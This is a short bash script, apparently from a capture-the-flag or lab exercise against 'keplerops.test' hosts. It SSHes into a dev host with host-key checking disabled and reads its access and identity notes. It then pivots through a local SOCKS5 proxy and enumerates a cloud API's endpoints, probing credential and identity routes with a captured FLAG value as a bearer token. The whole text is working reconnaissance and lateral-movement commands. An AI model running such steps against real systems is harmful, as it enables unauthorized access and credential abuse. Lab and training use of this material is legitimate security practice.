set +e
echo "===== PLATFORM-ACCESS ====="
ssh -o BatchMode=yes -o StrictHostKeyChecking=no rowan-dev 'cat work/platform-access.md; echo ---IDENT---; cat work/identity-access.md; echo ---SERVICE---; cat work/service-notes.md; echo ---HELPER---; cat work/local-helper.md' 2>&1
echo "===== CLOUD-API ROOT/DOCS ====="
P="--socks5-hostname 127.0.0.1:1080 -sk -m 15"
B=https://cloud-api.keplerops.test
for u in / /api /api/ /openapi.json /api/openapi.json /docs /api/docs /swagger.json /api/v1 /health /version /.well-known/fieldkest-client; do
  echo "----- $u"
  curl $P -i "$B$u" 2>&1 | head -30
done
echo "===== CLOUD-API workspace endpoints w/ token ====="
WT='FLAG{6bb66074f2325405}'
for u in "/api/workspaces" "/api/workspaces/current" "/api/workspaces/current/identity" "/api/workspaces/current/workload" "/api/workspaces/current/workloads" "/api/workspaces/current/credentials" "/api/workspaces/current/record" "/api/workspaces/current/records" "/api/workloads" "/api/workload-identities" "/api/identity" "/api/records"; do
  echo "----- GET $u"
  curl $P -w '\n[%{http_code}]\n' -H "Authorization: Bearer $WT" "$B$u" 2>&1 | head -20
done
